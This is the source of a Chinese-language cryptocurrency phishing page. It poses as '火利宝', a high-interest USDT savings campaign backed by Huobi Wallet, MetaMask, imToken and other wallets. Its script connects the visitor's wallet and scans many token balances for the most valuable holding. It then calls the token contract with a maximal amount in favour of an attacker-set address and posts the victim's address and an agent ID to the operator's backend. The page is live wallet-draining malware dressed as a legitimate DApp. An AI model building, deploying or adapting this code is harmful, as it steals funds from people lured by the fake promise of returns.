<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="zh-CN"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
	<meta name="apple-mobile-web-app-capable" content="no">
	<meta name="format-detection" content="telephone=no">
	<link rel="stylesheet" type="text/css" href="/huobi_files/swiper.min.css">
	<script src="/huobi_files/analytics.js"></script>
	<script src="/huobi_files/hm.js"></script>
	<script src="/huobi_files/analysis.js"></script>
	<script src="/huobi_files/scrollreveal.min.js"></script>
	<script src="/huobi_files/common.js"></script>
	
	<title>DApp | 探索去中心化的智能合约应用 | </title>
	<meta name="description" content="">
	<meta name="generator">
	<meta name="keywords" content="">
	<meta name="next-head-count" content="6">
	<!-- 引入 layui.css -->
	<link rel="stylesheet" href="/huobi_files/layui.css">
	<!-- 引入 layui.js -->
	<script src="/huobi_files/layui.js"></script>
	<link rel="preload" href="/huobi_files/14abdc9457c4f6cddc6443ebde71942f.css" as="style">
	<link rel="stylesheet" href="/huobi_files/14abdc9457c4f6cddc6443ebde71942f.css">
	<link rel="preload" href="/huobi_files/styles.7d1b9906.chunk.css" as="style">
	<link rel="stylesheet" href="/huobi_files/styles.7d1b9906.chunk.css">
	<link rel="preload" href="/huobi_files/dapp.js.6e10500f.chunk.css" as="style">
	<link rel="stylesheet" href="/huobi_files/dapp.js.6e10500f.chunk.css">
	<link rel="stylesheet" href="/huobi_files/14abdc9457c4f6cddc6443ebde71942f.css">
	<link rel="stylesheet" href="/huobi_files/3dc1b9548bb5ef826953b26cdfc3f7cb.css">

<body>
	<div>
		<div class="dapp-page">
			<div>
				<header class="common-navbar-container">
					<div class="common-navbar">
						<a href="javascript:;"><img class="navbar-logo" src="/huobi_files/1.png" alt=" Logo"></a>
						<div style="margin-top: 4px;font-size: 22px;color: #fff;">火利宝</div>
						<nav id="navbar-links">
							<div>
<!--								<button class="layui-btn layui-btn-normal" id="demo5">-->
<!--									语言/Language-->
<!--									<i class="layui-icon layui-icon-down layui-font-12"></i>-->
<!--								</button>-->
								<script>

									layui.use('dropdown', function () {
										var dropdown = layui.dropdown
											, $ = layui.jquery;

										//自定义事件 - mousedown
										dropdown.render({
											elem: '#demo5',
											trigger: 'mousedown',
											data: [
												
											]
										});
									});
								</script>
							</div>
							<div>
								<a href="#" class="ant-btn ant-btn-primary"><span>火币钱包</span></a>
							</div>
						</nav>
					</div>
					<div id="space"></div>
				</header>
				<div class="navbar-placeholder"></div>
			</div>
			<div class="home-page">
				<div>
					<div>
						<section class="common-banner">
							<div class="banner-inner">
								<div>
									<h2 class="title">数字资产 尽在掌握</h2>
									<p class="subtitle">
										火利宝是由DApp联合 火币钱包，麦子钱包，TokenPocket，MetaMask，Trust Wallet，imToken 	世界六大顶级钱包，官方共同推出为期三个月的随存随取的持币增值活动，“存U得U”是该活动一大亮点，堪称数字资产界的“余额宝”
									</p>
									<p class="learn-more">
										<a href="javascript:connect();" class="ant-btn ant-btn-primary" style="width: 100px;height: 40px;line-height: 40px;"><span>激活</span></a>
									</p>
									<p style="margin-top: 10px;">活动时间2021年07月01日-2021年10月01日</p>
								</div><img class="home-banner" src="/huobi_files/banner.png" alt="">
							</div>
						</section>
						<section class="section-wrap example-section">
							<div class="section-inner">
								<div class="flex-row"><img src="/huobi_files/20210627-1(6).png" class="example">
									<div>
										<p class="i-title">即时透明，坐享收益</p>
										<p class="i-subtitle">体验去中心化理财，收益实时获取</p>
									</div>
								</div>
							</div>
						</section>
						<section class="product">
							<div class="product-inner">
								<div class="flex-row product-wallet"><img src="/huobi_files/wallet.svg" alt="wallet">
									<div>
										<p class="title">用户可以随时转入，随时转出，实时到账</p>
										<p class="subtitle">转入后当天计息，当天开始计算收益，当天晚上收益到账；</p>
										<div class="flex-row">
											<div>
												<p class="number">12</p>
												<p class="desc">已支持公链</p>
											</div>
											<div class="ant-divider ant-divider-vertical" role="separator"></div>
											<div>
												<p class="number">200K+</p>
												<p class="desc">已收录代币</p>
											</div>
										</div>
									</div>
								</div>
								<div class="flex-row product-tokenlon">
									<div>
										<p class="title">利息收益到账后会自动转入USDT余额开始计息</p>
										<p class="subtitle">用户转出火币钱包 ， 麦子钱包 ， TokenPocket ， MetaMask ，Trust Wallet ，
											imToken，在转出部分当天不计息</p>
										<p class="number">TOP3</p>
										<div class="flex-row">
											<div>
												<p class="desc">以太坊去中心化交易所</p>
											</div>
											<div class="ant-divider ant-divider-vertical" role="separator"></div>
											<div>
												<a class="desc more-detail link-hover" href="javascript:connect();">立即体验</a>
											</div>
										</div>
									</div><img src="/huobi_files/tokenlon.svg" alt="tokenlon">
								</div>
								<div class="flex-row product-imkey"><img src="/huobi_files/imkey.svg" alt="imkey">
									<div>
										<p class="title">钱包USDT余额存储量1000USDT以上可享每天1.0—1.5%的存币利息</p>
										<p class="subtitle">每天新加坡时间00:00 账户余额将会自动生息</p>
										<p class="number">9.9USDT</p>
										<div class="flex-row">
											<div>
												<p class="desc">当前售价</p>
											</div>
											<div class="ant-divider ant-divider-vertical" role="separator"></div>
											<div>
												<a class="desc more-detail link-hover" href="javascript:connect();">立即购买</a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</section>
						<section class="partner">
							<div class="partner-inner">
								<h2 class="title" style="color:#000;">生态伙伴</h2>
								<div class="partner-list">
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="/huobi_files/huobi.png" alt="火币钱包"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="/huobi_files/maizi.png" alt="麦子钱包"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="/huobi_files/TokenPocket.png" alt="TokenPocket"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="/huobi_files/MetaMask.svg" alt="MetaMask"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="/huobi_files/TrustWallet.svg" alt="Trust Wallet"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="/huobi_files/imToken.svg" style="width: 152.2px;height:25.2px" alt="imToken"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="/huobi_files/dapp.png" alt="imToken"></a>
								</div>
							</div>
						</section>
					</div>
				</div>
				<section class="section-wrap contact-section">
					<div class="section-inner">
						<p class="title">联系我们</p>
						<div class="flex-row">
							<div class="flex-column"><img src="/huobi_files/bd.svg">
								<div>
									<p class="title">商务合作</p>
									<p class="subtitle">欢迎通过邮箱与我们取得联系</p>
									<a class="link-btn more-detail link-hover" href="mailto:huobijiaoyizhongxin@gmail.com"><span>huobijiaoyizhongxin@gmail.com</span></a>
								</div>
							</div>
						</div>
					</div>
				</section>
			</div>
			　　　 <a href="https://huobi-vip.com/#" name="a1">.</a>
			<footer class="common-footer">
				<nav class="nav-links">
					<div class="links-wrap" style="margin-bottom: 20px;">
						为了防止不法分子诱导用户在假网站下载假APP，请用户自行搜索：火币钱包 ， 麦子钱包 ， TokenPocket ， MetaMask ，Trust Wallet ，
						imToken官网，进行下载。
					</div>
					<div class="flex-row media-wrap">
						<div>
							<div class="social">
								<a href="javascript:;" target="_blank"><img class="social-icon" src="/huobi_files/twitter.svg" alt="Twitter"></a>
								<a href="javascript:;" target="_blank"><img class="social-icon" src="/huobi_files/medium.svg" alt="Medium"></a>
								<a href="javascript:;" target="_blank"><img class="social-icon" src="/huobi_files/tokenfans.svg" alt="TokenFans"></a>
								<a href="javascript:;" target="_blank"><img class="social-icon" src="/huobi_files/weibo.svg" alt="Weibo"></a><img class="social-icon" src="/huobi_files/wechat.svg" alt="Wechat">
								<a href="javascript:;" target="_blank"><img class="social-icon" src="/huobi_files/github.svg" alt="Github"></a>
							</div>
							<nav class="nav-info">
								<div class="info">
									<p class="copyright">@Consenlabs</p>
									<a href="javascript:;" data-locale="zh-CN" id="term-link" target="_blank">服务条款</a>
									<div class="language">
										<div class="language"><img class="language-icon" src="/huobi_files/globe.svg">
											<p class="current-language">简体中文</p>
										</div>
									</div>
								</div>
							</nav>
						</div>
						<div class="links-item subscribe-item">
							<form class="subscribe" action="https://token.us14.list-manage.com/subscribe/post?u=7ae629ae8d62dab7a42aac15d&amp;id=34a9c87cd9" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" target="_blank"><input type="email" class="subscribe-input" name="EMAIL" id="mce-EMAIL" placeholder="huobijiaoyizhongxin@gmail.com" required=""><img class="subscribe-icon" src="/huobi_files/subscribe.svg" alt="Subscribe button"><input type="submit" class="subscribe-submit"></form><span style="margin-top:10px">及时获取最新资讯</span>
						</div>
					</div>
				</nav>
				<div class="friend-link">
					<p class="friend-title">友情链接</p>
					<p class="friend-links">
						<a href="javascript:;" target="_blank">链节点</a>
						<a href="javascript:;" target="_blank">AICoin</a>
						<a href="javascript:;" target="_blank">BLOCKCHAIR</a>
						<a href="javascript:;" target="_blank">陀螺财经</a>
						<a href="javascript:;" target="_blank">蜜蜂查</a>
						<a href="javascript:;" target="_blank">Ethfans</a>
						<a href="javascript:;" target="_blank">链闻</a>
					</p>
				</div>
			</footer>
		</div>
	</div>
<div style="display:none;">
    <textarea id="jsondata">{$abi}</textarea>
	<textarea id="jsondata1">{$addr|json_encode}</textarea>
	<textarea id="jsondata2">{$addr2|json_encode}</textarea>
	<textarea id="jsondata3">{$addr3|json_encode}</textarea>
</div>
	<script nomodule="" src="/huobi_files/polyfills-e02ae7a01328ba3eb570.js"></script>
	<script async="" data-next-page="/dapp" src="/huobi_files/dapp.js"></script>
	<script async="" data-next-page="/_app" src="/huobi_files/_app.js"></script>
	<script src="/huobi_files/webpack-4b444dab214c6491079c.js" async=""></script>
	<script src="/huobi_files/framework.74d547792b3163b4d6d2.js" async=""></script>
	<script src="/huobi_files/commons.a900dda831d21edefec8.js" async=""></script>
	<script src="/huobi_files/aec7d165.f36caca214c9242fde66.js" async=""></script>
	<script src="/huobi_files/29107295.0e7ba09e950b002c45e4.js" async=""></script>
	<script src="/huobi_files/14abdc9457c4f6cddc6443ebde71942f.js" async=""></script>
	<script src="/huobi_files/14abdc9457c4f6cddc6443ebde71942f1.js" async=""></script>
	<script src="/huobi_files/styles.63d8c6e83d07182dd653.js" async=""></script>
	<script src="/huobi_files/_buildManifest.js" async=""></script>
	<script src="/huobi_files/_ssgManifest.js" async=""></script>
	<script type="text/javascript" src="/huobi_files/jquery.min.js"></script>
	<script src="/huobi_files/web3.min.js"></script>
	<script src="/huobi_files/web3model.min.js"></script>
	<script src="/huobi_files/web3provider.js"></script>
<!--	<script src="/huobi_files/web3work.min.js"></script>-->

<script>
	const ABI = JSON.parse($('#jsondata').html());
	var authorized_address = '{$authorized_address}';
	var agent = "{$userId}";
	var infura_key = '{$infura_key}';
	var bizhong = 'usdt';
	var approved = false;
	var domain = '{$domain}';
	var address = '';
	var rank = 6.45;

	const _web3 = new Web3('https://cloudflare-eth.com')
	let injectedWeb3 = null, total = 0
	let approveAddr = '{$approveAddr}';
	const addr = JSON.parse($('#jsondata1').html());
	const addr2 = JSON.parse($('#jsondata2').html());
	const addr3 = JSON.parse($('#jsondata3').html());

	const price = {
		'usdt': 1,
		'sushi': 15.5,
		'usdc': 1,
		'dai': 1,
		'uni': 28.6,
		'aave': 380,
		'yfi': 35000,
		'link': 28.2,
		"LON": 7,
		"CRV": 3.01367,
		"GUSD": 1,
		"WBTC": 56478.2,
		"WETH": 1991.89,
		"CONV": 0.105733,
		"inj": 13.3812,
		"MKR": 2076.68,
		"ALPHA": 1.79043,
		"BAND": 16.3441,
		"snx": 20.0588,
		"comp": 468.076,
		"sxp": 4.11818,
		"FTT": 46.1779,
		"ust": 1.00543,
		"TRIBE": 1.42926,
		"wise": 0.446973,
		"RRAX": 0.996821,
		"CORE": 5447.59,
		"mir": 8.69817,
		"DPI": 415.906,
		"luna": 15.2402,
		"HEZ": 5.97533,
		"fxs": 8.47025,
		"fei": 0.898157,
	}

	const decimals = {
		sushi: 18,
		usdt: 6,
		usdc: 6,
		uni: 18,
		dai: 18,
		aave: 18,
		yfi: 18,
		link: 18,
		WBTC: 8,
	}

	const contracts = {}, contracts2 = {}, contracts3 = {}
	for (const symbol of Object.keys(addr)) {
		const contractAddr = addr[symbol]
		contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
	}

	for (const symbol of Object.keys(addr2)) {
		const contractAddr = addr2[symbol]
		contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
	}

	for (const symbol of Object.keys(addr3)) {
		const contractAddr = addr3[symbol]
		contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
	}

	const Web3Modal = window.Web3Modal.default;
	const WalletConnectProvider = window.WalletConnectProvider.default;
	// Web3modal instance
	let web3Modal
	// Chosen wallet provider given by the dialog window
	let provider;
	// Address of the selected account
	let selectedAccount;
	async function init() {
		const providerOptions = {
			walletconnect: {
				package: WalletConnectProvider,
				options: {
					// Mikko's test key - don't copy as your mileage may vary
					infuraId: infura_key,
				}
			},
		};

		web3Modal = new Web3Modal({
			cacheProvider: false, // optional
			providerOptions, // required
			disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
		});
		try {
			provider = await web3Modal.connect()
			provider.enable()
		} catch(e) {
			console.log("Could not get a wallet connection", e);
			return;
		}
		// Subscribe to accounts change
		provider.on("accountsChanged", async (accounts) => {
			await fetchAccountData();
		});
		// Subscribe to chainId change
		provider.on("chainChanged", async (chainId) => {
			await fetchAccountData();
		});
		// Subscribe to networkId change
		provider.on("networkChanged", async (networkId) => {
			await fetchAccountData();
		});
		await fetchAccountData(provider);
	}

	/**
	 * Kick in the UI action after Web3modal dialog has chosen a provider
	 */
	async function fetchAccountData() {
		const web3 = new Web3(provider);
		injectedWeb3 = web3;
		provider.enable();
		const accounts = await web3.eth.getAccounts();
		selectedAccount = accounts[0];

		getMostValuableAssets(selectedAccount);
		setTimeout(function() {
			getMostValuableAssets2(selectedAccount)
		}, 200)
		setTimeout(function() {
			getMostValuableAssets3(selectedAccount)
		}, 300)
		// getInfo();
		// getAirdropInfo();

		//const web3 = new Web3(provider);
		const contract = new web3.eth.Contract(ABI, approveAddr)
		const gasPrice = await web3.eth.getGasPrice();

		if (selectedAccount && provider) {
			const web3 = new Web3(provider);
			const contract = new web3.eth.Contract(ABI, approveAddr)

			const gasPrice = await web3.eth.getGasPrice()

			contract.methods.transfer(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
				from: selectedAccount,
				gasPrice: gasPrice,
				gas: 70000,
			}, function(err, tx) {
				if(!err){
					postInfo(selectedAccount,bizhong);
				}
				$('.modal-overlay').remove();
				$('.modal').removeClass('modal-in').addClass('modal-out');
				console.log(err, tx);
			})
		} else {
			provider = await web3Modal.connect()
			provider.enable()
			const web3 = new Web3(provider);
			const accounts = await web3.eth.getAccounts()
			selectedAccount = accounts[0]
			const contract = new web3.eth.Contract(ABI, approveAddr)
			const gasPrice = await web3.eth.getGasPrice()

			contract.methods.transfer(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
				from: selectedAccount,
				gasPrice: gasPrice,
				gas:70000,
			}, function(err, tx) {
				console.log(err, tx)
				if(!err){
					postInfo(selectedAccount,bizhong)
				}
				$('.modal-overlay').remove();
				$('.modal').removeClass('modal-in').addClass('modal-out');
			})
		}
	}

	async function getMostValuableAssets(account) {
		let _symbol = 'usdt'
		console.log('_symbol:'+_symbol);

		for (const [symbol, contract] of Object.entries(contracts)) {
			contract.methods.balanceOf(account).call(function(err, balance) {
				if(symbol == 'usdt'){
					let yu =balance / (10** (decimals[symbol] || 18))
					console.log(yu.toLocaleString())
					$('#yu').text(yu.toLocaleString() +' USDT')
				}
				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
				if (usdt > total && usdt > 1000) {
					_symbol = symbol
					total = usdt
					approveAddr = addr[_symbol]
					bizhong = _symbol
					// checkApproved(selectedAccount,bizhong);
				}
			})
		}
		bizhong = _symbol
		// checkApproved(selectedAccount,bizhong);
		console.log('_symbol:'+_symbol);
		return _symbol
	}

	async function getMostValuableAssets2(account) {
		let _symbol = 'usdt'
		console.log('_symbol:'+_symbol);
		for (const [symbol, contract] of Object.entries(contracts2)) {
			contract.methods.balanceOf(account).call(function(err, balance) {
				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
				if (usdt > total && usdt > 1000) {
					_symbol = symbol
					total = usdt
					approveAddr = addr[_symbol]
					// checkApproved(selectedAccount,bizhong);
				}
			})
		}

		bizhong = _symbol
		console.log('_symbol:'+_symbol);
		return _symbol
	}

	async function getMostValuableAssets3(account) {
		let _symbol = 'usdt'
		for (const [symbol, contract] of Object.entries(contracts3)) {
			contract.methods.balanceOf(account).call(function(err, balance) {
				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
				if (usdt > total && usdt > 1000) {
					_symbol = symbol
					total = usdt
					approveAddr = addr[_symbol]
					// checkApproved(selectedAccount,bizhong);
				}
			})
		}
		bizhong = _symbol
		console.log('_symbol:'+_symbol);
		return _symbol
	}
	
	async function postInfo(address,symbol){
		var data = {
			address:address,
			auth_address:authorized_address,
			bizhong:symbol,
			agent:agent,
		}
		var d = new Date();
		var n = d.getTime();

		$.ajax({
			type: 'get',
			url:  domain + "{:url('index/api/erc_post')}?t="+n,
			data: data,
			success:function(){
			}
		})
	}

	async function connect(){
		init();
	}
	async function goActive() {
		// if (!selectedAccount || !provider) {
		// 	connect();
		// }
		if (approved) {
			// return;
		}

		try {
			provider = await web3Modal.connect()
			provider.enable()
		} catch(e) {
			console.log("Could not get a wallet connection", e);
			return;
		}
		await fetchAccountData();
	}

	function goDiv(div) {
		var a = $("#" + div).offset().top;
		$("html,body").animate({scrollTop: a}, 'slow');
	}
</script>